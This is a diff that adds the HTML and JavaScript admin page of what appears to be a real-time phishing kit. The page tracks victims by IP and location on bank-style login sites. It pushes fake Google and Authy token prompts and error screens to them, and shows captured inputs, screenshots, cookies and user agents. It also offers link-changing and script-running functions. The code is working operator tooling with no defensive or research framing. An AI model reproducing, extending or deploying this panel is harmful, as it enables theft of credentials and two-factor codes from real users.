@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <title>WEBADMIN</title>
+      <!-- HTML5 Shim and Respond.js IE10 support of HTML5 elements and media queries -->
+      <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+      <!--[if lt IE 10]>
+      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+      <![endif]-->
+      <!-- Meta -->
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+      <meta name="description" content=""/>
+      <meta name="keywords" content=""/>
+      <meta name="author" content="CodedThemes" />
+      <!-- Favicon icon -->
+      <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon">
+      <!-- fontawesome icon -->
+      <link rel="stylesheet" href="assets/fonts/fontawesome/css/fontawesome-all.min.css">
+      <!-- material icon -->
+      <link rel="stylesheet" href="assets/fonts/material/css/materialdesignicons.min.css">
+      <!-- animation css -->
+      <link rel="stylesheet" href="assets/plugins/animation/css/animate.min.css">
+      <!-- data tables css -->
+      <link rel="stylesheet" href="assets/plugins/data-tables/css/datatables.min.css">
+      <!-- prism css -->
+      <link rel="stylesheet" href="assets/plugins/prism/css/prism.min.css">
+	  <!-- toolbar css -->
+	  <link rel="stylesheet" href="assets/plugins/toolbar/css/jquery.toolbar.css">
+      <!-- vendor css -->
+      <link rel="stylesheet" href="assets/css/style.css">
+      <link rel="stylesheet" href="assets/css/style_action.css">
+      <link rel="stylesheet" href="assets/css/style_custom.css">
+	  <style>
+	  
+	  .padding-b-0 {
+		padding-bottom: 0 !important;
+	  }
+	  
+	  .padding-t-0 {
+		padding-top: 0 !important;
+	  
+	  }
+	  
+	  .data-input-page{
+		color: #fff;
+		margin-right: 20px;
+		font-size: 13px;
+	  }
+	  
+	  .btn {
+    padding: 4px 10px;
+    border-radius: 0.25rem;
+    font-size: 14px;
+    margin-bottom: 0;
+    margin-right: 0;
+    -webkit-transition: all 0.3s ease-in-out;
+    transition: all 0.3s ease-in-out;
+	}
+	  </style>
+   </head>
+   <body>
+
+         <audio id="notificacao" preload="auto">
+           <source src="../config/sounds/sound_01.wav" type="audio/mpeg">
+         </audio>
+
+      <!-- [ Pre-loader ] start -->
+      <div class="loader-bg">
+         <div class="loader-track">
+            <div class="loader-fill"></div>
+         </div>
+      </div>
+      <!-- [ Pre-loader ] End -->
+      <!-- [ navigation menu ] start -->
+     
+      <!-- [ navigation menu ] end -->
+      <!-- [ Header ] start -->
+      <header class="navbar pcoded-header navbar-expand-lg navbar-light headerpos-fixed header-blue">
+         <div class="m-header">
+            <a class="mobile-menu" id="mobile-collapse1" href="javascript:"><span></span></a>
+            <a href="index.html" class="b-brand">
+               <div class="b-bg">
+                  <i class="feather icon-trending-up"></i>
+               </div>
+               <span class="b-title">WEBADMIN</span>
+            </a>
+         </div>
+         <a class="mobile-menu" id="mobile-header" href="javascript:">
+         <i class="feather icon-more-horizontal"></i>
+         </a>
+         <div class="collapse navbar-collapse">
+            <ul class="navbar-nav mr-auto">
+               <li><a href="javascript:" class="full-screen" onclick="javascript:toggleFullScreen()"><i class="feather icon-maximize"></i></a></li>
+               <li class="nav-item">
+                  <div class="main-search">
+                     <div class="input-group">
+                        <input type="text" id="m-search" class="form-control" placeholder="Search . . .">
+                        <a href="javascript:" class="input-group-append search-close">
+                        <i class="feather icon-x input-group-text"></i>
+                        </a>
+                        <span class="input-group-append search-btn btn btn-primary">
+                        <i class="feather icon-search input-group-text"></i>
+                        </span>
+                     </div>
+                  </div>
+               </li>
+            </ul>
+            <ul class="navbar-nav ml-auto">
+               <li>
+                  <div class="dropdown drp-user">
+                     <a href="javascript:" class="dropdown-toggle" data-toggle="dropdown">
+                     <i class="icon feather icon-settings"></i>
+                     </a>
+                     <div class="dropdown-menu dropdown-menu-right profile-notification">
+                        <div class="pro-head">
+                           <img src="assets/images/user/avatar-1.jpg" class="img-radius" alt="User-Profile-Image">
+                           <span>User-1 [Admin]</span>
+                           <!--<a href="auth-signin.html" class="dud-logout" title="Logout">
+                              <i class="feather icon-log-out"></i>
+                              </a>-->
+                        </div>
+                        <ul class="pro-body">
+                           <li><a href="javascript:" class="dropdown-item"><i class="feather icon-settings"></i> Create Account</a></li>
+                           <li><a href="javascript:" class="dropdown-item"><i class="feather icon-user"></i> Logout</a></li>
+                        </ul>
+                     </div>
+                  </div>
+               </li>
+            </ul>
+         </div>
+      </header>
+      <!-- [ Header ] end -->
+      <!-- xx[ Table User-LINK-ALERT ] Start -->
+	  
+	  <section class="pcoded-main-container fix-bottom">
+	
+	   
+	   
+         <div class="pcoded-wrapper">
+		 
+            <div class="pcoded-content padding-b-0">
+               <div class="pcoded-inner-content padding-b-0">
+			   
+                  <!-- [ breadcrumb ] start -->
+                  <!-- [ breadcrumb ] end -->
+                 <div class="main-body">
+                     <div class="page-wrapper">
+                        <!-- [ Main Content ] start -->
+                        <div class="row">
+                           <!-- [ task-list ] start -->
+                           <div class="col-sm-12">
+                              <div class="card">
+                                 <div class="card-header">
+                                    <h5>Controles</h5>
+                                    <div class="card-header-right">
+                                       <div class="btn-group card-option">
+                                          <button type="button" class="btn dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                          <i class="feather icon-more-horizontal"></i>
+                                          </button>
+                                          <ul class="list-unstyled card-option dropdown-menu dropdown-menu-right">
+                                             <li class="dropdown-item full-card"><a href="#!"><span><i class="feather icon-maximize"></i> maximize</span><span style="display:none"><i class="feather icon-minimize"></i> Restore</span></a></li>
+                                             <li class="dropdown-item minimize-card"><a href="javascript:"><span><i class="feather icon-minus"></i> collapse</span><span style="display:none"><i class="feather icon-plus"></i> expand</span></a></li>
+                                             <li class="dropdown-item reload-card"><a href="#!"><i class="feather icon-refresh-cw"></i> reload</a></li>
+                                             <li class="dropdown-item close-card"><a href="javascript:"><i class="feather icon-trash"></i> remove</a></li>
+                                          </ul>
+                                       </div>
+                                    </div>
+                                 </div>
+                                 <div class="card-block task-data">
+                                    <div class="table-responsive form-material">
+                                      <button id="btn_sound_style" class="btn"><i class="far fa-bell m-r-5"></i><span id="btn_sound">--</span></button>
+                                      <button id="admin_status" class="btn btn-success" data-status="connected"><i class="far fa-bell m-r-5"></i><span>Connected</span></button>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                           <!-- [ task-list ] end -->
+                        </div>
+                        <!-- [ Main Content ] end -->
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </section>
+	   <!-- xx[ Table User-LINK-ALERT ] Start -->
+	   
+
+      <section class="pcoded-main-container fix-bottom padding-t-0">
+	
+	   
+	   
+         <div class="pcoded-wrapper padding-t-0">
+		 
+            <div class="pcoded-content padding-t-0 ">
+               <div class="pcoded-inner-content">
+			   
+                  <!-- [ breadcrumb ] start -->
+                  <!-- [ breadcrumb ] end -->
+                 <div class="main-body">
+                     <div class="page-wrapper">
+                        <!-- [ Main Content ] start -->
+                        <div class="row">
+                           <!-- [ task-list ] start -->
+                           <div class="col-sm-12">
+                              <div class="card">
+                                 <div class="card-header">
+                                    <h5>ONLINE</h5>
+                                    <div class="card-header-right">
+                                       <div class="btn-group card-option">
+                                          <button type="button" class="btn dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                          <i class="feather icon-more-horizontal"></i>
+                                          </button>
+                                          <ul class="list-unstyled card-option dropdown-menu dropdown-menu-right">
+                                             <li class="dropdown-item full-card"><a href="#!"><span><i class="feather icon-maximize"></i> maximize</span><span style="display:none"><i class="feather icon-minimize"></i> Restore</span></a></li>
+                                             <li class="dropdown-item minimize-card"><a href="javascript:"><span><i class="feather icon-minus"></i> collapse</span><span style="display:none"><i class="feather icon-plus"></i> expand</span></a></li>
+                                             <li class="dropdown-item reload-card"><a href="#!"><i class="feather icon-refresh-cw"></i> reload</a></li>
+                                             <li class="dropdown-item close-card"><a href="javascript:"><i class="feather icon-trash"></i> remove</a></li>
+                                          </ul>
+                                       </div>
+                                    </div>
+                                 </div>
+                                 <div class="card-block task-data">
+                                    <div class="table-responsive form-material">
+                                       <table id="table-users" class="table-100 table  task-list-table table-striped table-bordered nowrap">
+                                          <thead>
+                                             <tr>
+                                                <th class="t-a-center" style="width: 5%;">Status</th>
+                                                <th style="width: 15%;">User</th>
+                                                 <th style="width: 5%;">Type</th>
+												<th style="width: 40%;">URL</th>
+                                               
+            
+                                                <th style="width: 2%;">Operate</th>
+                                             </tr>
+                                          </thead>
+                                          <tbody class="task-page" id="onlineUsers">
+                                             <!-- <tr class="tr-link-alert">
+                                                <td class="t-a-center"><i class="fas fa-circle text-c-green f-10"></i></td>
+                                                <td><h6 class="mb-1"><a href="#"> H425REE345235R </a></h6></td>
+                                                <td><h6 class="mb-1"><a href="#"> NBP </a></h6></td>
+												<td><h6 class="mb-1"><a href="#"> https://www.siteHighLight01.com/login/ </a></h6></td>
+												
+                                                <td>
+                                                   <button class="btn btn-success" onclick="location.href='data_user.html'">Operate</button>
+ 
+                                                </td>
+                                             </tr> -->
+                                          </tbody>
+                                       </table>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                           <!-- [ task-list ] end -->
+                        </div>
+                        <!-- [ Main Content ] end -->
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </section>
+      <!-- xx[ Table User-LINK-ALERT ] Start -->
+     
+      <!-- xx[ Table Users-LINK-ALERT ] End -->
+      <!-- xx[ Table Users ] Start -->
+      <section class="pcoded-main-container fix-top">
+         <div class="pcoded-wrapper">
+            <div class="pcoded-content">
+               <div class="pcoded-inner-content">
+                  <!-- [ breadcrumb ] start -->
+                  <!-- [ breadcrumb ] end -->
+                  <div class="main-body">
+                     <div class="page-wrapper">
+                        <!-- [ Main Content ] start -->
+                        <div class="row">
+                           <!-- [ task-list ] start -->
+                           <div class="col-sm-12">
+                              <div class="card">
+                                 <div class="card-header">
+                                    <h5>OFFLINE</h5>
+                                    <div class="card-header-right">
+                                       <div class="btn-group card-option">
+                                          <button type="button" class="btn dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                          <i class="feather icon-more-horizontal"></i>
+                                          </button>
+                                          <ul class="list-unstyled card-option dropdown-menu dropdown-menu-right">
+                                             <li class="dropdown-item full-card"><a href="#!"><span><i class="feather icon-maximize"></i> maximize</span><span style="display:none"><i class="feather icon-minimize"></i> Restore</span></a></li>
+                                             <li class="dropdown-item minimize-card"><a href="javascript:"><span><i class="feather icon-minus"></i> collapse</span><span style="display:none"><i class="feather icon-plus"></i> expand</span></a></li>
+                                             <li class="dropdown-item reload-card"><a href="#!"><i class="feather icon-refresh-cw"></i> reload</a></li>
+                                             <li class="dropdown-item close-card"><a href="javascript:"><i class="feather icon-trash"></i> remove</a></li>
+                                          </ul>
+                                       </div>
+                                    </div>
+                                 </div>
+                                 <div class="card-block task-data">
+                                    <div class="table-responsive form-material">
+                                       <table id="table-users" class="table-100 table  task-list-table table-striped table-bordered nowrap">
+                                                                                   <thead>
+                                             <tr>
+                                                <th class="t-a-center" style="width: 5%;">Status</th>
+                                                <th style="width: 15%;">User</th>
+                                                 <th style="width: 5%;">Type</th>
+												<th style="width: 40%;">URL</th>
+                                               
+            
+                                                <th style="width: 2%;">Operate</th>
+                                             </tr>
+                                          </thead>
+                                          <tbody class="task-page" id="offlineUsers">
+
+											 
+											 
+                                             <!-- <tr class="tr-link">
+                                                <td class="t-a-center"><i class="fas fa-circle f-10"></i></td>
+                                                 <td><h6 class="mb-1"><a href="#"> H234REE345235R </a></h6></td>
+                                                 <td><h6 class="mb-1"><a href="#"> XDP </a></h6></td>
+                                     <td><h6 class="mb-1"><a href="#"> https://www.siteHighLight01.com/login/ </a></h6></td>
+                                     
+                                                 <td>
+                                                    <button class="btn btn-success">View</button>
+  
+                                                 </td>
+                                              </tr> -->
+											 
+                                            
+											 
+											 
+                                          </tbody>
+                                       </table>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                           <!-- [ task-list ] end -->
+                        </div>
+                        <!-- [ Main Content ] end -->
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </section>
+      <!-- xx[ Table Users ] End -->
+      <!-- xx[ action options list ] start -->
+      <section class="header-options-list">
+         <div class="h-list-header">
+            <div class="input-group">
+               <input type="text" id="search-action" class="form-control" placeholder="Search Action . . .">
+            </div>
+         </div>
+         <div class="h-list-body">
+            <a href="javascript:" class="h-close-text"><i class="feather icon-chevrons-right"></i></a>
+            <div class="main-friend-cont scroll-div">
+               <div class="main-friend-list">
+                  <div class="optionslist-box">
+                     <label>Return</label>	
+                  </div>
+                  <div class="optionslist-box">
+                     <h5 class="action-header"><span>Token: <span class="copy-clipboard">254589<span></h5>
+                  </div>
+                  <div class="optionslist-box">
+                     <h5 class="action-header"><span>PrintScreen: 
+					 <img class="func-printscreen" style="width:40px;" src="assets/images/func/T420EEE345235R/print-1.png" alt="chat-user">
+					 <img class="func-printscreen" style="width:40px;" src="assets/images/func/T420EEE345235R/print-1.png" alt="chat-user">
+					 <img class="func-printscreen" style="width:40px;" src="assets/images/func/T420EEE345235R/print-1.png" alt="chat-user">
+					 <img class="func-printscreen" style="width:40px;" src="assets/images/func/T420EEE345235R/print-1.png" alt="chat-user">
+					 <img class="func-printscreen" style="width:40px;" src="assets/images/func/T420EEE345235R/print-1.png" alt="chat-user">
+					 </h5>
+                  </div>
+                  <div class="optionslist-box">
+                     <label>HTML__</label>
+                  </div>
+                  <div class="action-html  media optionslist-box" data-id="1" data-status="online" data-username="HTML__Google-Token">
+                     <a class="media-left" href="javascript:alert('HTML__Google-Token');">
+                     <img class="media-object img-radius" src="assets/images/user/avatar-1.jpg" alt="Generic placeholder image "></a>
+                     <div class="media-body">
+                        <h6 class="action-header">HTML__Google-Token</h6>
+                        <div id="action-google-token" style="display:none;">
+                           <div class="group-button-action">					
+                              <a class="text-white label theme-bg3 active f-12 " href="#!">Start</a>
+                              <a class="text-white label theme-bg3 f-12" href="#!">token</a>
+                              <a class="text-white label theme-bg3 f-12" href="#!">loader</a>
+                              <a class="text-white label theme-bg3 f-12" href="#!">error</a>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="action-html media optionslist-box action-active" data-id="2" data-status="online" data-username="HTML__Authy-Token">
+                     <a class="media-left" href="javascript:alert('HTML__Authy-Token');"><img class="media-object img-radius" src="assets/images/user/avatar-2.jpg" alt="Generic placeholder image"></a>
+                     <div class="media-body" >
+                        <h6 class="action-header">HTML__Authy-Token</h6>
+                        <div id="action-google-token" style="display:block;">
+                           <div class="group-button-action">					
+                              <a class="text-white label theme-bg3 active f-12 " href="#!">Start</a>
+                              <a class="text-white label theme-bg3 f-12" href="#!">token</a>
+                              <a class="text-white label theme-bg3 f-12" href="#!">loader</a>
+                              <a class="text-white label theme-bg3 f-12" href="#!">error</a>
+                           </div>
+                           <div class="group-button-action">
+                              <a class="text-white label theme-bg3 f-12 " href="#!">Start</a>
+                              <a class="text-white label theme-bg3 f-12" href="#!">token</a>
+                              <a class="text-white label theme-bg3 f-12" href="#!">loader</a>
+                              <a class="text-white label theme-bg3 f-12" href="#!">error</a>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="action-html media optionslist-box" data-id="3" data-status="online" data-username="HTML__error-connection">
+                     <a class="media-left" href="javascript:alert('HTML__error-connection');"><img class="media-object img-radius" src="assets/images/user/avatar-2.jpg" alt="Generic placeholder image"></a>
+                     <div class="media-body" >
+                        <h6 class="action-header">HTML__error-connection</h6>
+                     </div>
+                  </div>
+                  <div class="optionslist-box">
+                     <label>FUNCTION__</label>
+                  </div>
+                  <div class="media optionslist-box" data-id="4" data-status="offline" data-username="Alia">
+                     <a class="media-left" href="javascript:"><img class="media-object img-radius" src="assets/images/user/avatar-1.jpg" alt="Generic placeholder image">
+                     </a>
+                     <div class="media-body">
+                        <h6 class="action-header">FUNC__Print-Screen<small class="d-block text-c-green">Active</small></h6>
+                     </div>
+                  </div>
+                  <div class="media optionslist-box" data-id="5" data-status="offline" data-username="Suzen">
+                     <a class="media-left" href="javascript:"><img class="media-object img-radius" src="assets/images/user/avatar-4.jpg" alt="Generic placeholder image"></a>
+                     <div class="media-body">
+                        <h6 class="action-header">FUNC__Change-Links<small class="d-block text-c-green">Active</small></h6>
+                     </div>
+                  </div>
+                  <div class="media optionslist-box" data-id="1" data-status="online" data-username="Josephin Doe">
+                     <a class="media-left" href="javascript:"><img class="media-object img-radius" src="assets/images/user/avatar-1.jpg" alt="Generic placeholder image ">
+                     </a>
+                     <div class="media-body">
+                        <h6 class="action-header">FUNC__Run-Script<small class="d-block text-c-green">Active</small></h6>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </section>
+      <!-- xx[ action user list ] end -->
+      <!-- xx[ Modal ] start -->
+      <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+         <div class="modal-dialog" role="document">
+            <div class="modal-content">
+               <div class="modal-header">
+                  <h5 class="modal-title" id="exampleModalLabel">Save Annotation</h5>
+                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+               </div>
+               <div class="modal-body">
+                  <form>
+                     <div class="form-group">
+                        <label for="recipient-name" class="col-form-label">ID:</label>
+                        <input type="text" class="form-control" disabled id="recipient-name">
+                     </div>
+                     <div class="form-group">
+                        <label for="message-text" class="col-form-label">Message:</label>
+                        <textarea class="form-control" id="message-text"></textarea>
+                     </div>
+                  </form>
+               </div>
+               <div class="modal-footer">
+                  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                  <button type="button" class="btn btn-primary">Send message</button>
+               </div>
+            </div>
+         </div>
+      </div>
+      <div id="exampleModalCenter" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+         <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+               <div class="modal-header">
+                  <h5 class="modal-title" id="exampleModalCenterTitle">Form Data <span> | 1 / 25 |  <i class="mdi mdi-delete"></i> </span></h5>
+				
+                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+
+               </div>
+				
+				<div style="border-bottom:1px solid #333; padding: 20px">
+				<span>Date: 25/01/2019 - 18:46:55 |  </span>
+               </div>
+				
+               <div class="modal-body">
+                  <p>Log saved from captured inputs</p>
+				  
+
+				
+               </div>
+	
+               <div class="modal-footer">
+                 <!-- <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>-->
+				   <div id="pagination">
+						<nav aria-label="Page navigation example">
+							<ul class="pagination">
+								<li class="page-item"><a class="page-link" href="#!" aria-label="Previous"><span aria-hidden="true">«</span><span class="sr-only">Previous</span></a></li>
+								<li class="page-item"><a class="page-link" href="#!" aria-label="Next"><span aria-hidden="true">»</span><span class="sr-only">Next</span></a></li>
+							</ul>
+						</nav>
+				   </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <div id="exampleModalPopovers" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="exampleModalPopoversLabel" aria-hidden="true">
+         <div class="modal-dialog" role="document">
+            <div class="modal-content">
+               <div class="modal-header">
+                  <h5 class="modal-title" id="exampleModalPopoversLabel">Modal Title</h5>
+                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+               </div>
+               <div class="modal-body">
+                  <h5>Tooltips in a Button</h5>
+                  <p>This <a href="#!" role="button" class="btn btn-secondary tooltip-test" data-toggle="tooltip" title="Button Tooltip" data-container="#exampleModalPopovers">button</a>
+                     triggers a popover on click.
+                  </p>
+                  <hr />
+                  <h5>Tooltips in a modal</h5>
+                  <p><a href="#!" class="tooltip-test" data-toggle="tooltip" title="Tooltip" data-container="#exampleModalPopovers">This link</a> and <a href="#!" class="tooltip-test" data-toggle="tooltip"
+                     title="Tooltip" data-container="#exampleModalPopovers">that link</a> have tooltips on hover.</p>
+               </div>
+               <div class="modal-footer">
+                  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                  <button type="button" class="btn btn-primary">Save changes</button>
+               </div>
+            </div>
+         </div>
+      </div>
+      <div class="modal fade bd-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" aria-hidden="true">
+         <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+               <div class="modal-header">
+                  <h5 class="modal-title h4" id="myLargeModalLabel">Large Modal</h5>
+                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+               </div>
+               <div class="modal-body">
+                  ...
+               </div>
+            </div>
+         </div>
+      </div>
+      <div class="modal fade bd-example-modal-sm" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
+         <div class="modal-dialog modal-sm">
+            <div class="modal-content">
+               <div class="modal-header">
+                  <h5 class="modal-title h4" id="mySmallModalLabel">Small Modal</h5>
+                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+               </div>
+               <div class="modal-body">
+                  ...
+               </div>
+            </div>
+         </div>
+      </div>
+	  
+	  
+	  
+      <!-- xx[ Tooltip ] start -->
+		<div id="toolbar-links" class="hidden">
+			<a href="javascript:"> https://www.siteAlert02.com/login/</a>
+		</div>
+		
+		<div id="toolbar-action" class="hidden">
+			<a href="javascript:"><i class="_cookie mdi mdi-cookie"></i></a>
+			<a href="javascript:"><i class="_ip mdi mdi-ip"></i></a>
+			<a href="javascript:"><i class="_userAgent mdi mdi-clipboard-account"></i></a>
+		</div>
+	  <!-- xx[ Tooltip ] end -->
+      
+	  
+	  <!-- xx[ Modal ] end -->
+      <!-- Required Js -->
+      <script src="assets/js/vendor-all.min.js"></script>
+      <script src="assets/js/pcoded.min.js"></script>
+      <script src="assets/js/pcoded_action.js"></script>
+      <!-- prism Js -->
+      <script src="assets/plugins/prism/js/prism.min.js"></script>
+      <!-- Data tables.js -->
+      <script src="assets/plugins/data-tables/js/datatables.min.js"></script>
+	  <!-- toolbar Js -->
+	  <script src="assets/plugins/toolbar/js/jquery.toolbar.min.js"></script>
+      <script src="assets/js/pages/ac-toolbar.js"></script>
+	  
+	 <script src="../config/config.js"></script>
+     
+      <script type="text/javascript">
+         setTimeout(function() {
+             $('#table-users-link-alert, #table-users').DataTable();
+         }, 600);
+      </script>
+      <script>
+         $('#exampleModal').on('show.bs.modal', function(event) {
+             var button = $(event.relatedTarget) // Button that triggered the modal
+             var recipient = button.data('whatever') // Extract info from data-* attributes
+             var modal = $(this)
+             modal.find('.modal-title').text('Save Annotation ' + recipient)
+             modal.find('.modal-body input').val(recipient)
+         })
+		 
+		 
+		 /* button sound on/off --------------------------------------------------------------------*/
+		 
+		 let status_sound = false
+		 let ping_interval = 5;
+		 
+		 sound_on = function () {
+			status_sound = true
+			$('#notificacao').trigger('play')
+			$("#btn_sound").text('Sound on')
+			$("#btn_sound_style").removeClass('btn-danger')
+			$("#btn_sound_style").addClass('btn-success')
+		 }
+		 
+		sound_off = function(){
+			status_sound = false
+			$("#btn_sound").text('Sound off')
+			$("#btn_sound_style").removeClass('btn-success')
+			$("#btn_sound_style").addClass('btn-danger')
+		}
+
+		 $("#btn_sound").click(function(){
+			if(status_sound != true) {
+				sound_on()
+			}else {
+				sound_off()
+			}
+		 });
+			
+		if(status_sound == true){
+			sound_on()
+		 }else {
+			sound_off()
+		 }
+		/*--------------------------------------------------------------------------------------------*/
+		 
+         
+      // PCODES
+      var token = '';
+      connect();
+      function connect(){
+         ws.onopen = event=>{
+            let key = localStorage.getItem(admin_localstorage);
+            ws.send(JSON.stringify({action: "validate", key: key}));
+            ws.send(JSON.stringify({action: "ping"}));
+            adminStatus();
+         };
+
+
+         ws.onmessage = response=>{
+               response = JSON.parse(response.data);
+
+               switch(response.action){
+                  case "validate-response":
+                     if(response.status!="ok") 
+                        window.location.href = "./login.html";
+                     else   
+                        token = response.token;   
+                     break;
+                  case "refresh-users":
+                     updateList(response);
+                     break;
+                  case "pong":
+                     setTimeout(function() {
+                        ws.send(JSON.stringify({action: "ping"}));
+                     }, ping_interval * 1000);	
+                     
+                     break;
+               }
+         };
+      }
+      
+
+      function status(s){
+         if(s)  ws.send(JSON.stringify({action: "admin-status", status: true, token: token}));
+         else ws.send(JSON.stringify({action: "admin-status", status: false, token: token}));
+      }
+
+      function adminStatus(){
+	  debugger
+         $("#admin_status").unbind();
+         $("#admin_status").click(function(){
+            if($(this).data("status")=="diconnected"){
+               $(this).data("status", "connected");
+               $(this).attr("class", "btn btn-success");
+               $(this).find("span").html("Connected");
+               connect();
+            }else{
+               $(this).data("status", "diconnected");
+               $(this).attr("class", "btn btn-danger");
+               $(this).find("span").html("Disconnect"); 
+               ws.close();
+            }
+         });
+      }
+
+      function updateList(data)
+      {
+         console.log(data);
+         if(data.action=="refresh-users")
+         {
+                  
+            $("#onlineUsers").html("");
+            $("#offlineUsers").html("");
+            for(let i=0; i<data.users.length; i++)
+            {
+               let current = data.users[i];
+
+               if(current.isActive){
+                  let html = "";
+
+                  html += "<tr class='tr-link-alert'>";
+                  html += "<td class='t-a-center'><i class='fas fa-circle text-c-green f-10'></i></td>";
+                  html += "<td><h6 class='mb-1'><a target='_blank' href='./data_user.html#" +current.id+ "'>"+current.ip + "_" + current.country + "_" + current.region +"</a></h6></td>";
+                  html += "<td><h6 class='mb-1'><a target='_blank'  href='" + current.site.site + "'>"+current.site.name+"</a></h6></td>";
+                  html += "<td><h6 class='mb-1'><a target='_blank' href='" + current.site.site + "'>"+current.site.site+"</a></h6></td>";
+                  html += "<td>";
+                  html += "<button class='btn btn-success' id='"+current.id+"'>Operate</button>";
+                  html += "</td>";
+                  html += "</tr>";
+				  
+                  $("#onlineUsers").append(html);
+               
+               }else{
+                  let html = "";
+
+                  html += "<tr class='tr-link'>";
+                  html += "<td class='t-a-center'><i class='fas fa-circle f-10'></i></td>";
+                   html += "<td><h6 class='mb-1'><a target='_blank' href='./data_user.html#" +current.id+ "'>"+current.ip + "_" + current.country + "_" + current.region +"</a></h6></td>";
+                  html += "<td><h6 class='mb-1'><a href='#'>"+current.site.name+"</a></h6></td>";
+                  html += "<td><h6 class='mb-1'><a target='_blank' href='" + current.site.site + "'>"+current.site.site+"</a></h6></td>";
+                  html += "<td>";
+                  html += "<button class='btn btn-success' id='"+current.id+"'>View</button>";
+                  html += "</td>";
+                  html += "</tr>";
+				 
+
+                  $("#offlineUsers").append(html);
+               }
+
+               $("#"+current.id).unbind();
+               $("#"+current.id).click(function(){
+                  //window.location.href = "./data_user.html#"+$(this).attr("id");
+                  window.open("./data_user.html#"+$(this).attr("id"), '_blank');
+               });
+
+               $("#delete_"+current.id).click(function(){
+                  var tid = $(this).data("id");
+                  ws.send(JSON.stringify({action: "delete-item", id: tid, token: token}));
+               });
+
+               $("#block_"+current.id).click(function(){
+                  var tid = $(this).data("id");
+                  ws.send(JSON.stringify({action: "block-item", id: tid, token: token}));
+               });
+            }
+
+            // NOTIFY SOUNDS
+            if(data.notify && status_sound == true){
+               $('#notificacao').trigger('play');
+            }
+
+         }
+      }
+     </script>
+   </body>
+</html>
